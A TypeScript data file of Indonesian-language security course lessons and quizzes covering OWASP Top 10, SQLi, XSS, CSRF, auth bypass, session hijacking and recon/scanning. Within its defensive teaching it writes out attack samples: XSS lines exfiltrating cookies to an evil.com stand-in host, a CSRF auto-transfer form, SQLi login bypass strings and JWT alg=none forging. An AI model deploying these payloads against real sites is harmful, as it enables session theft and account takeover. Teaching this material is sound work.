import { MaterialData } from "../src/lib/content-types";

export const contentLevels4to7: MaterialData[] = [
  // ==================== LEVEL 4 - WEB SECURITY (10) ====================
  {
    level: 4,
    order: 1,
    title: "OWASP Top 10",
    slug: "owasp-top-10",
    description: "Mengenal 10 kerentanan web paling kritis menurut OWASP.",
    icon: "📋",
    isProject: false,
    content: `# OWASP Top 10

**OWASP Top 10** adalah daftar standar internasional yang merangkum sepuluh risiko keamanan aplikasi web paling kritis, diperbarui secara berkala oleh Open Web Application Security Project (OWASP). Daftar ini menjadi rujukan utama developer dan pentester untuk memprioritaskan mitigasi.

## Risiko Utama (2021)

Beberapa risiko paling sering muncul meliputi:

1. **Broken Access Control** — user mengakses resource di luar otorisasinya.
2. **Cryptographic Failures** — enkripsi lemah atau data sensitif tidak dilindungi.
3. **Injection** — SQLi, command injection, LDAP injection.
4. **Insecure Design** — kelemahan arsitektur sejak awal.
5. **Security Misconfiguration** — konfigurasi default atau error handling buruk.

## Cara Identifikasi

\`\`\`bash
# Cek header keamanan dasar
curl -I https://target.example.com

# Scan dengan OWASP ZAP CLI
zap-cli quick-scan https://target.example.com
zap-cli active-scan https://target.example.com
\`\`\`

## Mitigasi

\`\`\`text
- Terapkan principle of least privilege
- Gunakan framework modern dengan default aman
- Validasi & sanitize input di sisi server
- Aktifkan HTTPS, HSTS, CSP, X-Frame-Options
- Lakukan dependency scanning berkala (npm audit, Snyk)
\`\`\`

> OWASP Top 10 bukan daftar tertutup — gunakan sebagai checklist minimal, bukan batas maksimal keamanan aplikasi Anda.`,
    quiz: [
      {
        question: "Apa itu OWASP Top 10?",
        options: ["Daftar 10 antivirus terbaik", "Daftar 10 risiko keamanan web paling kritis", "Standar enkripsi", "Framework JavaScript"],
        answer: 1,
        explanation: "OWASP Top 10 adalah daftar risiko keamanan aplikasi web paling kritis yang diperbarui berkala oleh OWASP."
      },
      {
        question: "Risiko apa yang paling sering muncul di OWASP 2021?",
        options: ["Broken Access Control", "CSS Injection", "Buffer Overflow", "DNS Spoofing"],
        answer: 0,
        explanation: "Broken Access Control menempati posisi pertama di OWASP Top 10 versi 2021."
      },
      {
        question: "Tool OWASP yang populer untuk scan aplikasi web?",
        options: ["Wireshark", "OWASP ZAP", "Nmap", "Metasploit"],
        answer: 1,
        explanation: "OWASP ZAP (Zed Attack Proxy) adalah tool scanner keamanan web open-source dari OWASP."
      }
    ]
  },
  {
    level: 4,
    order: 2,
    title: "SQL Injection",
    slug: "sql-injection",
    description: "Serangan menyisipkan kode SQL berbahaya untuk manipulasi database.",
    icon: "💉",
    isProject: false,
    content: `# SQL Injection

**SQL Injection (SQLi)** adalah serangan di mana penyerang menyisipkan kode SQL berbahaya melalui input form atau URL untuk memanipulasi query database. Konsekuensinya bisa berupa pencurian data, bypass autentikasi, hingga penghapusan seluruh tabel.

## Cara Kerja

\`\`\`sql
-- Query rentan (string concatenation)
SELECT * FROM users WHERE username = '\${username}' AND password = '\${password}'
\`\`\`

Jika penyerang memasukkan \`admin' --\` sebagai username, query menjadi:

\`\`\`sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
\`\`\`

Bagian \`--\` menjadikan pengecekan password diabaikan, sehingga login berhasil.

## Jenis Serangan

- **In-band UNION** — menggabungkan hasil query dengan \`UNION SELECT\`.
- **Boolean-based blind** — menyimpulkan data dari true/false response.
- **Time-based blind** — menggunakan \`SLEEP()\` untuk inferensi data.
- **Error-based** — memanfaatkan pesan error database.

## Pencegahan

\`\`\`python
# Prepared statement (AMAN)
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))

# ORM dengan parameter binding
User.objects.filter(username=username, password=hash(password))
\`\`\`

\`\`\`bash
# Tes dengan sqlmap
sqlmap -u "https://target.example.com/login" --data="user=1&pass=1" --dbs
\`\`\`

> Selalu gunakan prepared statements atau ORM dengan parameter binding. Jangan pernah concatenate string ke query SQL.`,
    quiz: [
      {
        question: "Apa itu SQL Injection?",
        options: ["Backup database", "Menyisipkan SQL berbahaya untuk manipulasi database", "Optimasi query", "Enkripsi data"],
        answer: 1,
        explanation: "SQL Injection menyisipkan kode SQL berbahaya melalui input untuk memanipulasi query database."
      },
      {
        question: "Cara terbaik mencegah SQLi?",
        options: ["String concatenation", "Mematikan database", "Prepared statements", "Menyembunyikan form"],
        answer: 2,
        explanation: "Prepared statements memisahkan kode SQL dari data input sehingga input tidak diinterpretasi sebagai perintah."
      },
      {
        question: "Input apa yang dapat bypass login?",
        options: ["admin/admin", "' OR '1'='1", "DROP TABLE", "SELECT *"],
        answer: 1,
        explanation: "' OR '1'='1 membuat kondisi WHERE selalu true, sehingga login berhasil tanpa password valid."
      }
    ]
  },
  {
    level: 4,
    order: 3,
    title: "Cross-Site Scripting (XSS)",
    slug: "xss-cross-site-scripting",
    description: "Menyisipkan script berbahaya ke halaman web yang dilihat user lain.",
    icon: "🎭",
    isProject: false,
    content: `# Cross-Site Scripting (XSS)

**XSS** adalah serangan di mana penyerang menyisipkan script (biasanya JavaScript) ke halaman web yang dilihat oleh user lain. Script ini dieksekusi di browser korban dan dapat mencuri cookie, sesi, atau melakukan aksi atas nama korban.

## Jenis XSS

1. **Reflected XSS** — payload dikirim via URL dan dipantulkan langsung ke response.
2. **Stored XSS** — payload disimpan di server (mis. komentar) dan menyerang siapa pun yang melihatnya.
3. **DOM-based XSS** — payload dieksekusi di sisi client melalui manipulasi DOM.

## Contoh Payload

\`\`\`text
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=fetch('https://evil.com/?c='+document.cookie)>
\`\`\`

## Pencegahan

\`\`\`javascript
// Escape output sebelum render
function escapeHtml(str) {
  return str.replace(/[&<>"']/g, c => ({
    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
  }[c]));
}

// React otomatis escape, JANGAN pakai dangerouslySetInnerHTML tanpa sanitasi
\`\`\`

\`\`\`bash
# Header Content Security Policy
Content-Security-Policy: default-src 'self'; script-src 'self'
\`\`\`

> Escape output, gunakan CSP, dan sanitasi input HTML dengan library seperti DOMPurify.`,
    quiz: [
      {
        question: "Apa tujuan utama serangan XSS?",
        options: ["Mempercepat server", "Mengeksekusi script di browser korban", "Backup data", "Mengoptimasi query"],
        answer: 1,
        explanation: "XSS menyisipkan script yang dieksekusi di browser korban untuk mencuri data atau mengendalikan sesi."
      },
      {
        question: "Jenis XSS yang disimpan di server dan menyerang banyak user?",
        options: ["Reflected XSS", "Stored XSS", "DOM XSS", "Blind XSS"],
        answer: 1,
        explanation: "Stored XSS payload disimpan di server (mis. kolom komentar) dan menyerang setiap user yang melihat halaman tersebut."
      },
      {
        question: "Header HTTP apa yang membantu mitigasi XSS?",
        options: ["Content-Type", "Content-Security-Policy", "Cache-Control", "Accept-Language"],
        answer: 1,
        explanation: "Content-Security-Policy (CSP) membatasi sumber script yang boleh dieksekusi, memitigasi XSS."
      }
    ]
  },
  {
    level: 4,
    order: 4,
    title: "CSRF Attack",
    slug: "csrf-attack",
    description: "Memaksa user melakukan aksi tak diinginkan di aplikasi yang sedang login.",
    icon: "🎣",
    isProject: false,
    content: `# CSRF Attack

**Cross-Site Request Forgery (CSRF)** adalah serangan di mana penyerang memaksa user yang sudah login melakukan aksi tak diinginkan pada aplikasi target. Berbeda dengan XSS, CSRF tidak mencuri cookie, tetapi memanfaatkan cookie yang otomatis dikirim browser.

## Cara Kerja

User yang sedang login ke \`bank.example.com\` mengunjungi halaman jahat yang berisi:

\`\`\`html
<!-- Hidden form auto-submit -->
<form action="https://bank.example.com/transfer" method="POST" id="f">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.getElementById('f').submit()</script>
\`\`\`

Browser akan mengirim cookie sesi bank secara otomatis, sehingga transfer dianggap sah.

## Pencegahan

\`\`\`python
# 1. Anti-CSRF token
<form method="POST">
  <input type="hidden" name="csrf_token" value="{{ csrf_token }}">
</form>

# 2. Validasi token di server
if request.form.get('csrf_token') != session['csrf_token']:
    abort(403)

# 3. Set SameSite cookie
Set-Cookie: session=xxx; SameSite=Strict; Secure; HttpOnly
\`\`\`

\`\`\`bash
# Tes endpoint tanpa token
curl -X POST https://target.example.com/delete -b "session=stolen" -d "id=42"
\`\`\`

> Selalu gunakan anti-CSRF token untuk state-changing request dan aktifkan atribut \`SameSite\` pada cookie.`,
    quiz: [
      {
        question: "Apa yang dimanfaatkan oleh serangan CSRF?",
        options: ["Kesalahan SQL", "Cookie sesi yang otomatis dikirim", "Buffer overflow", "DNS poisoning"],
        answer: 1,
        explanation: "CSRF memanfaatkan cookie sesi yang otomatis dikirim browser saat user yang sedang login mengunjungi halaman jahat."
      },
      {
        question: "Cara paling efektif mencegah CSRF?",
        options: ["HTTPS saja", "Anti-CSRF token", "Mematikan JavaScript", "Cache header"],
        answer: 1,
        explanation: "Anti-CSRF token memastikan request datang dari form yang sah, bukan dari situs penyerang."
      },
      {
        question: "Atribut cookie yang membantu mitigasi CSRF?",
        options: ["Max-Age", "SameSite", "Domain", "Path"],
        answer: 1,
        explanation: "Atribut SameSite=Strict atau Lax mencegah cookie dikirim pada cross-site request."
      }
    ]
  },
  {
    level: 4,
    order: 5,
    title: "Authentication Bypass",
    slug: "authentication-bypass",
    description: "Teknik melewati mekanisme autentikasi aplikasi web.",
    icon: "🔓",
    isProject: false,
    content: `# Authentication Bypass

**Authentication Bypass** adalah teknik untuk melewati mekanisme login tanpa kredensial yang sah. Penyerang memanfaatkan kelemahan logika, default credentials, atau kerentanan dalam implementasi autentikasi.

## Teknik Umum

1. **Default credentials** — login dengan \`admin/admin\`, \`admin/password\`.
2. **SQL Injection** — \`' OR '1'='1\` untuk bypass password check.
3. **Logic flaws** — manipulasi response atau parameter JSON.
4. **Brute force** — mencoba banyak password terhadap satu akun.
5. **JWT manipulation** — ubang algoritma ke \`none\` atau weak secret.

## Contoh Manipulasi JWT

\`\`\`python
# JWT dengan alg=none (BERBAHAYA)
import jwt
token = jwt.encode({"user":"admin","role":"admin"}, "", algorithm="none")
print(token)
# eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
\`\`\`

## Pencegahan

\`\`\`bash
# Rate limiting dengan fail2ban
[sshd]
maxretry = 3
bantime = 3600

# Brute-force protection di aplikasi
lock_account_after(5_failed_attempts)
delay_exponential_backoff()
require_mfa_for_admin()
\`\`\`

\`\`\`text
- Paksa password kuat + MFA
- Validasi algoritma JWT di server (whitelist HS256/RS256)
- Rate limiting + lockout
- Hapus default credentials
- Logging semua upaya login
\`\`\`

> Jangan pernah mengimplementasikan \`alg=none\` sebagai valid. Selalu whitelist algoritma JWT di sisi server.`,
    quiz: [
      {
        question: "Apa itu authentication bypass?",
        options: ["Backup kredensial", "Teknik melewati autentikasi tanpa kredensial sah", "Enkripsi password", "Reset password"],
        answer: 1,
        explanation: "Authentication bypass adalah teknik untuk melewati mekanisme login tanpa kredensial yang valid."
      },
      {
        question: "Cegah brute force login paling efektif?",
        options: ["HTTPS", "Rate limiting + lockout", "Cache", "Cookie"],
        answer: 1,
        explanation: "Rate limiting dan account lockout membatasi jumlah percobaan login, mempersulit brute force."
      },
      {
        question: "Apa risikanya mengizinkan alg=none pada JWT?",
        options: ["Tidak ada risiko", "Penyerang dapat membuat token sah tanpa signature", "Mempercepat server", "Meningkatkan keamanan"],
        answer: 1,
        explanation: "alg=none membuat token JWT tidak ditandatangani, sehingga penyerang dapat memalsukan token dengan payload apa pun."
      }
    ]
  },
  {
    level: 4,
    order: 6,
    title: "Session Hijacking",
    slug: "session-hijacking",
    description: "Mencuri session cookie untuk impersonasi user.",
    icon: "🍪",
    isProject: false,
    content: `# Session Hijacking

**Session Hijacking** adalah serangan di mana penyerang mencuri session ID (biasanya cookie) untuk menyamar sebagai user yang sah. Setelah mendapatkan session ID, penyerang dapat mengakses akun korban tanpa perlu login.

## Cara Mencuri Session

1. **XSS** — \`document.cookie\` dieksekusi di browser korban.
2. **Sniffing** — intercept traffic HTTP (bukan HTTPS) di jaringan publik.
3. **Session fixation** — memaksa korban menggunakan session ID tertentu.
4. **Sidejacking** — capture cookie via Wireshark di Wi-Fi terbuka.

## Simulasi Pencurian via XSS

\`\`\`javascript
// Payload XSS yang mengirim cookie ke server penyerang
new Image().src = 'https://evil.com/log?c=' + document.cookie;
\`\`\`

\`\`\`bash
# Capture cookie HTTP dengan Wireshark/tshark
tshark -i wlan0 -Y "http.cookie" -T fields -e http.cookie
\`\`\`

## Pencegahan

\`\`\`text
- Set flag HttpOnly pada cookie (mencegah akses JavaScript)
- Set flag Secure (hanya via HTTPS)
- Gunakan SameSite=Strict
- Regenerasi session ID setelah login
- Rotasi session + timeout idle
- Terapkan HSTS untuk paksa HTTPS
\`\`\`

\`\`\`nginx
# Konfigurasi Nginx cookie aman
proxy_cookie_path / "/; HTTPOnly; Secure; SameSite=Strict";
add_header Strict-Transport-Security "max-age=31536000" always;
\`\`\`

> Cookie dengan flag \`HttpOnly\` dan \`Secure\` secara signifikan mengurangi risiko session hijacking, terutama dari vektor XSS dan sniffing.`,
    quiz: [
      {
        question: "Apa itu session hijacking?",
        options: ["Menghapus session", "Mencuri session ID untuk impersonasi user", "Membuat session baru", "Enkripsi session"],
        answer: 1,
        explanation: "Session hijacking adalah pencurian session ID untuk menyamar sebagai user yang sedang login."
      },
      {
        question: "Flag cookie yang mencegah akses via JavaScript?",
        options: ["Secure", "HttpOnly", "SameSite", "Max-Age"],
        answer: 1,
        explanation: "HttpOnly mencegah cookie diakses melalui JavaScript, memitigasi pencurian cookie via XSS."
      },
      {
        question: "Cegah session fixation?",
        options: ["Jangan ubah session ID", "Regenerasi session ID setelah login", "Bagikan session ID", "Nonaktifkan cookie"],
        answer: 1,
        explanation: "Regenerasi session ID setelah login membatalkan session ID yang mungkin sudah disusupi penyerang."
      }
    ]
  },
  {
    level: 4,
    order: 7,
    title: "IDOR Vulnerability",
    slug: "idor-vulnerability",
    description: "Insecure Direct Object Reference - akses resource tanpa otorisasi.",
    icon: "🚪",
    isProject: false,
    content: `# IDOR Vulnerability

**Insecure Direct Object Reference (IDOR)** terjadi ketika aplikasi mengekspos referensi objek internal (ID, filename, key) langsung ke user tanpa validasi otorisasi. Penyerang cukup mengubah parameter untuk mengakses data user lain.

## Contoh Skenario

User A login dan mengakses profilnya:

\`\`\`text
GET /api/users/1001/profile  →  data user A
\`\`\`

Penyerang mencoba mengubah ID:

\`\`\`bash
# Mengakses profil user lain tanpa otorisasi
curl -H "Cookie: session=userA" https://target.example.com/api/users/1002/profile
curl https://target.example.com/api/users/1003/invoices/4567.pdf
\`\`\`

## Pencegahan

\`\`\`python
# BURUK: langsung pakai ID dari URL
@app.route("/api/users/<int:uid>/profile")
def profile(uid):
    return User.query.get(uid)  # IDOR!

# BAIK: validasi ownership
@app.route("/api/users/<int:uid>/profile")
@auth_required
def profile(uid):
    if uid != current_user.id and not current_user.is_admin:
        abort(403)
    return User.query.get(uid)
\`\`\`

\`\`\`text
- Gunakan UUID/guid alih-alih ID integer berurutan
- Implementasi authorization check di setiap endpoint
- Pakai indirect reference map per session
- Audit semua endpoint yang menerima ID resource
- Logging akses untuk deteksi anomali
\`\`\`

> IDOR adalah salah satu bentuk Broken Access Control yang paling umum dan berada di peringkat #1 OWASP Top 10 2021.`,
    quiz: [
      {
        question: "Apa itu IDOR?",
        options: ["Akses resource tanpa otorisasi via referensi objek", "Backup ID", "Enkripsi ID", "Menghapus ID"],
        answer: 0,
        explanation: "IDOR terjadi ketika user mengakses objek (ID/filename) tanpa validasi otorisasi."
      },
      {
        question: "Cara paling efektif mencegah IDOR?",
        options: ["Pakai ID integer berurutan", "Authorization check di setiap endpoint", "Bagikan semua ID", "Cache ID"],
        answer: 1,
        explanation: "Validasi otorisasi di setiap akses resource memastikan user hanya bisa mengakses data miliknya."
      },
      {
        question: "Mengapa UUID membantu mitigasi IDOR?",
        options: ["Mempercepat query", "Sulit ditebak & tidak berurutan", "Menghemat storage", "Mengompres data"],
        answer: 1,
        explanation: "UUID tidak berurutan dan sulit ditebak, sehingga penyerang tidak dapat menebak ID resource lain."
      }
    ]
  },
  {
    level: 4,
    order: 8,
    title: "Security Misconfiguration",
    slug: "security-misconfiguration",
    description: "Kesalahan konfigurasi yang membuka celah keamanan.",
    icon: "⚙️",
    isProject: false,
    content: `# Security Misconfiguration

**Security Misconfiguration** terjadi ketika sistem, aplikasi, atau server dikonfigurasi dengan pengaturan tidak aman — baik default, terlalu permisif, atau terbuka untuk umum. Ini termasuk dalam OWASP Top 10 dan sering menjadi pintu masuk utama penyerang.

## Contoh Umum

- Default credentials tidak diubah (\`admin/admin\`).
- Directory listing aktif.
- Stack trace error ditampilkan ke user.
- Service tidak perlu terbuka ke publik (SSH, DB, Redis).
- Sertifikat TLS expired atau self-signed tanpa validasi.
- Header keamanan (HSTS, CSP, X-Frame-Options) tidak diatur.

## Identifikasi

\`\`\`bash
# Cek header & versi server
curl -I https://target.example.com
nmap -sV -p 80,443,22,3306,6379 target.example.com

# Cek directory listing
curl https://target.example.com/.git/
curl https://target.example.com/backup/
\`\`\`

## Mitigasi

\`\`\`nginx
# Nginx hardening
server_tokens off;
add_header X-Frame-Options "SAMEORIGIN";
add_header X-Content-Type-Options "nosniff";
add_header Strict-Transport-Security "max-age=31536000" always;
add_header Content-Security-Policy "default-src 'self'";
\`\`\`

\`\`\`text
- Hardening sesuai CIS Benchmark
- Disable default accounts & ubah default password
- Tutup port yang tidak perlu (firewall)
- Matikan debug mode di production
- Hapus file backup/.git dari webroot
- Patch & update rutin
\`\`\`

> Konfigurasi aman bukan tugas sekali jalan. Lakukan audit berkala dan otomatisasi hardening dengan tools seperti Ansible atau Terraform.`,
    quiz: [
      {
        question: "Contoh security misconfiguration?",
        options: ["Enkripsi AES-256", "Default credentials tidak diubah", "HTTPS aktif", "Rate limiting"],
        answer: 1,
        explanation: "Default credentials yang tidak diubah adalah contoh klasik security misconfiguration."
      },
      {
        question: "Header yang mencegah clickjacking?",
        options: ["X-Frame-Options", "Content-Type", "Host", "Accept"],
        answer: 0,
        explanation: "X-Frame-Options mencegah halaman di-iframe oleh situs lain, memitigasi clickjacking."
      },
      {
        question: "Standar konfigurasi aman yang populer?",
        options: ["CIS Benchmark", "OWASP CSRFGuard", "RFC 1918", "ISO 8601"],
        answer: 0,
        explanation: "CIS Benchmark adalah panduan hardening konfigurasi sistem yang banyak diadopsi industri."
      }
    ]
  },
  {
    level: 4,
    order: 9,
    title: "Burp Suite Basics",
    slug: "burp-suite-basics",
    description: "Tool proxy intercept untuk pengujian keamanan web.",
    icon: "🔧",
    isProject: false,
    content: `# Burp Suite Basics

**Burp Suite** oleh PortSwigger adalah tool proxy intercept paling populer untuk pengujian keamanan aplikasi web. Burp berada di antara browser dan server, memungkinkan kita melihat, memodifikasi, dan mengulang request HTTP.

## Komponen Utama

1. **Proxy** — intercept & edit request/response secara real-time.
2. **Repeater** — kirim ulang request dengan modifikasi manual.
3. **Intruder** — fuzzing otomatis (sniper, battering ram, pitchfork).
4. **Scanner** (Pro) — automated vulnerability scanner.
5. **Decoder/Comparer** — encode/decode dan bandingkan response.

## Setup Proxy

\`\`\`bash
# Burp default listener
127.0.0.1:8080

# Konfigurasi Firefox ke proxy Burp
# Settings > Network Settings > Manual Proxy: 127.0.0.1:8080

# Install certificate CA Burp agar HTTPS bisa diintercept
# http://burp/cert  →  import ke Firefox Authorities
\`\`\`

## Workflow Dasar

\`\`\`text
1. Konfigurasi browser → proxy ke Burp
2. Browse target → Burp capture semua request di HTTP History
3. Kirim request ke Repeater (Ctrl+R) untuk modifikasi manual
4. Tes payload SQLi/XSS di parameter
5. Kirim ke Intruder untuk fuzzing otomatis
6. Analisis response untuk konfirmasi kerentanan
\`\`\`

\`\`\`bash
# Burp Community CLI (alternatif: mitmproxy)
mitmproxy --mode regular -p 8080
\`\`\`

> Burp Suite Community Edition sudah cukup untuk belajar web pentesting. Versi Pro menambahkan automated scanner dan ekstensi tambahan.`,
    quiz: [
      {
        question: "Apa fungsi Burp Suite?",
        options: ["Backup database", "Proxy intercept untuk uji keamanan web", "Antivirus", "Web server"],
        answer: 1,
        explanation: "Burp Suite adalah proxy yang intercept dan memodifikasi request HTTP untuk pengujian keamanan web."
      },
      {
        question: "Komponen Burp untuk mengulang request manual?",
        options: ["Intruder", "Repeater", "Decoder", "Scanner"],
        answer: 1,
        explanation: "Repeater digunakan untuk mengirim ulang request dengan modifikasi manual dan menganalisis response."
      },
      {
        question: "Port default listener Burp Suite?",
        options: ["80", "443", "8080", "3306"],
        answer: 2,
        explanation: "Burp Suite secara default mendengarkan proxy di 127.0.0.1:8080."
      }
    ]
  },
  {
    level: 4,
    order: 10,
    title: "Project: Web Vuln Assessment",
    slug: "project-web-vuln-assessment",
    description: "Proyek melakukan asesmen kerentanan web aplikasi lengkap.",
    icon: "🎯",
    isProject: true,
    content: `# Project: Web Vuln Assessment

Pada proyek akhir Level 4, Anda akan melakukan **asesmen kerentanan aplikasi web secara end-to-end** menggunakan metodologi OWASP dan tools profesional. Targetnya adalah aplikasi lab yang sengaja dibuat rentan (mis. DVWA, OWASP Juice Shop).

## Tahapan Proyek

### 1. Reconnaissance

\`\`\`bash
# Identifikasi teknologi
whatweb https://juice-shop.example.com
wappalyzer-cli https://juice-shop.example.com

# Subdomain & endpoint
gobuster dir -u https://juice-shop.example.com -w /usr/share/wordlists/dirb/common.txt
\`\`\`

### 2. Vulnerability Scanning

\`\`\`bash
# Automated scan
zap-cli quick-scan https://juice-shop.example.com
nikto -h https://juice-shop.example.com

# Manual testing dengan Burp Suite
# - Intercept semua form
# - Tes parameter untuk SQLi/XSS/IDOR
\`\`\`

### 3. Eksploitasi & Verifikasi

\`\`\`text
- Konfirmasi setiap finding secara manual
- Dokumentasikan PoC (screenshot, request, response)
- Klasifikasikan severity (Critical/High/Medium/Low) berdasar CVSS
- Jangan eksploitasi lebih dari yang diperlukan untuk PoC
\`\`\`

## Deliverables

\`\`\`text
1. Laporan PDF dengan struktur:
   - Executive Summary
   - Methodology
   - Findings (dengan PoC & remediation)
   - Risk Rating Matrix
2. File Burp Project (.burp) dengan semua request
3. Video demo eksploitasi tiap kerentanan
4. Checklist OWASP Top 10 yang tercakup
\`\`\`

> Proyek ini mensimulasikan engagement pentest nyata. Dokumentasi yang baik sama pentingnya dengan temuan teknis — klien membaca laporan, bukan terminal Anda.`,
    quiz: [
      {
        question: "Aplikasi lab yang sengaja dibuat rentan untuk belajar?",
        options: ["OWASP Juice Shop", "Gmail", "GitHub", "Netflix"],
        answer: 0,
        explanation: "OWASP Juice Shop adalah aplikasi modern yang sengaja dibuat rentan untuk latihan keamanan web."
      },
      {
        question: "Tool untuk brute-force directory web?",
        options: ["Gobuster", "Wireshark", "Nmap -sV", "tcpdump"],
        answer: 0,
        explanation: "Gobuster adalah tool populer untuk menemukan direktori dan file tersembunyi via brute-force wordlist."
      },
      {
        question: "Apa yang harus ada di laporan pentest?",
        options: ["Hanya temuan", "Methodology, Findings, PoC, Remediation", "Foto penyerang", "Kode sumber aplikasi"],
        answer: 1,
        explanation: "Laporan pentest profesional mencakup metodologi, temuan dengan PoC, severity, dan rekomendasi remediasi."
      }
    ]
  },

  // ==================== LEVEL 5 - ETHICAL HACKING (8) ====================
  {
    level: 5,
    order: 1,
    title: "Pengenalan Ethical Hacking",
    slug: "pengenalan-ethical-hacking",
    description: "Memahami peran ethical hacker dan metodologi pentest.",
    icon: "⚔️",
    isProject: false,
    content: `# Pengenalan Ethical Hacking

**Ethical Hacking** adalah praktik menyerang sistem secara legal dan terstruktur untuk menemukan kerentanan sebelum penyerang sungguhan melakukannya. Pelakunya disebut **ethical hacker** atau **penetration tester**, bekerja dengan izin tertulis dari pemilik sistem.

## Jenis Hacker

- **White Hat** — hacker etis, bekerja dengan izin untuk meningkatkan keamanan.
- **Black Hat** — penyerang jahat, ilegal, motivasi keuntungan pribadi.
- **Gray Hat** — menembus sistem tanpa izin, tapi tidak untuk kejahatan.

## Jenis Penetration Test

1. **Black Box** — tester tidak tahu apa-apa tentang target.
2. **White Box** — tester diberi akses penuh (source code, arsitektur).
3. **Gray Box** — kombinasi, sebagian info diberikan.

## Metodologi PTES

\`\`\`text
1. Pre-engagement Interactions   (kontrak, scope, RoE)
2. Intelligence Gathering        (reconnaissance)
3. Threat Modeling               (analisis aset & ancaman)
4. Vulnerability Analysis        (scan & identifikasi)
5. Exploitation                  (memanfaatkan kerentanan)
6. Post-Exploitation             (privilege escalation, persistensi)
7. Reporting                     (dokumentasi & remediasi)
\`\`\`

## Kode Etik

\`\`\`bash
# Aturan emas ethical hacker:
# 1. Dapatkan izin tertulis SEBELUM testing
# 2. Hormati privacy & jangan akses data pribadi
# 3. Jangan menyebabkan downtime
# 4. Laporkan semua temuan ke klien
# 5. Jaga kerahasiaan data yang ditemukan
\`\`\`

> Tanpa izin tertulis (Rules of Engagement / RoE), aktivitas "hacking" adalah kejahatan pidana. Etika adalah pondasi profesi ethical hacker.`,
    quiz: [
      {
        question: "Apa yang membedakan ethical hacker dengan black hat?",
        options: ["Skill teknis", "Izin tertulis dari pemilik sistem", "Jenis tool", "Sistem operasi"],
        answer: 1,
        explanation: "Ethical hacker bekerja dengan izin tertulis dan tujuan meningkatkan keamanan, sementara black hat ilegal."
      },
      {
        question: "Pentest di mana tester tidak diberi info apapun?",
        options: ["White Box", "Black Box", "Gray Box", "Red Box"],
        answer: 1,
        explanation: "Black box testing mensimulasikan penyerang eksternal tanpa pengetahuan internal tentang target."
      },
      {
        question: "Tahap pertama metodologi PTES?",
        options: ["Exploitation", "Reporting", "Pre-engagement Interactions", "Reconnaissance"],
        answer: 2,
        explanation: "Pre-engagement interactions adalah tahap awal di mana kontrak, scope, dan rules of engagement disepakati."
      }
    ]
  },
  {
    level: 5,
    order: 2,
    title: "Information Gathering",
    slug: "information-gathering",
    description: "Fase reconnaissance - mengumpulkan info target sebelum serang.",
    icon: "🕵️",
    isProject: false,
    content: `# Information Gathering

**Reconnaissance** atau information gathering adalah fase pertama dan paling penting dalam ethical hacking. Kualitas info yang terkumpul menentukan keberhasilan fase berikutnya. Dibagi menjadi **passive** (tanpa kontak langsung dengan target) dan **active** (interaksi langsung).

## Passive Recon

\`\`\`bash
# WHOIS - info registrasi domain
whois example.com

# DNS records
dig ANY example.com
dnsenum example.com

# Search engine dorking
# site:example.com filetype:pdf
# intitle:"index of" "parent directory"

# Subdomain enumeration
subfinder -d example.com -silent
amass enum -d example.com
\`\`\`

## Active Recon

\`\`\`bash
# Network range discovery
whois -h whois.radb.net -- '-i origin AS12345'

# Ping sweep
nmap -sn 10.10.10.0/24

# Port scan dasar
nmap -sS -sV -O 10.10.10.5
\`\`\`

## OSINT Tools

\`\`\`text
- theHarvester     : email, subdomain, employee
- Maltego          : visual link analysis
- Shodan           : search engine untuk perangkat IoT
- Recon-ng         : framework modular OSINT
- Google Dorks     : pencarian lanjutan
- Wayback Machine  : arsip versi situs lama
\`\`\`

\`\`\`bash
# theHarvester
theHarvester -d example.com -b google,bing,linkedin

# Shodan search
shodan search "apache country:ID"
\`\`\`

> Recon yang baik membuka 80% peluang eksploitasi. Luangkan waktu ekstra di fase ini — info presisi tentang target selalu lebih bernilai daripada ratusan exploit buta.`,
    quiz: [
      {
        question: "Perbedaan passive dan active reconnaissance?",
        options: ["Passive pakai tools, active tidak", "Passive tanpa kontak langsung target, active ada interaksi", "Tidak ada beda", "Active lebih cepat"],
        answer: 1,
        explanation: "Passive recon tidak menghasilkan traffic langsung ke target, sedangkan active recon berinteraksi langsung."
      },
      {
        question: "Tool untuk enumerasi subdomain?",
        options: ["Wireshark", "Subfinder", "Nmap -sV", "John"],
        answer: 1,
        explanation: "Subfinder dan Amass adalah tool populer untuk menemukan subdomain target secara passive."
      },
      {
        question: "Search engine yang khusus untuk perangkat IoT?",
        options: ["Google", "Shodan", "Bing", "DuckDuckGo"],
        answer: 1,
        explanation: "Shodan adalah search engine yang mengindeks perangkat terhubung internet (server, IoT, kamera)."
      }
    ]
  },
  {
    level: 5,
    order: 3,
    title: "Scanning & Enumeration",
    slug: "scanning-enumeration",
    description: "Memindai port, service, dan enumerasi target.",
    icon: "🔍",
    isProject: false,
    content: `# Scanning & Enumeration

Setelah recon, kita memasuki fase **scanning** untuk menemukan port terbuka, service, dan versi yang berjalan. **Enumeration** mendalami service yang ditemukan untuk mengumpulkan info lebih detail (user, share, banner).

## Port Scanning dengan Nmap

\`\`\`bash
# TCP SYN scan (stealth) + versi service + OS detection
nmap -sS -sV -O 10.10.10.5

# Scan semua port
nmap -p- 10.10.10.5

# Scan via script NSE
nmap -sC -sV 10.10.10.5

# UDP scan (lambat)
nmap -sU --top-ports 50 10.10.10.5
\`\`\`

## Enumeration per Service

\`\`\`bash
# SMB enumeration
enum4linux-ng -A 10.10.10.5
smbclient -L //10.10.10.5 -N

# NFS
showmount -e 10.10.10.5

# SSH banner
nc 10.10.10.5 22

# HTTP directory
gobuster dir -u http://10.10.10.5 -w common.txt -x php,txt
\`\`\`

## Masscan untuk Jaringan Besar

\`\`\`bash
# Scan jaringan besar super cepat
masscan -p1-65535 10.10.10.0/24 --rate=10000
\`\`\`

## Tips Optimasi

\`\`\`text
- Mulai dari top-1000 ports, lalu -p- bila perlu
- Gabungkan NSE script sesuai service
- Catat versi service untuk cari exploit di Exploit-DB
- Bandingkan banner dengan CVE database (searchsploit)
\`\`\`

> Enumeration adalah seni. Service yang sama bisa membuka banyak pintu — SMB share anonim, FTP anonymous, atau default credentials SNMP sering kali membuka jalan masuk awal.`,
    quiz: [
      {
        question: "Flag Nmap untuk deteksi versi service?",
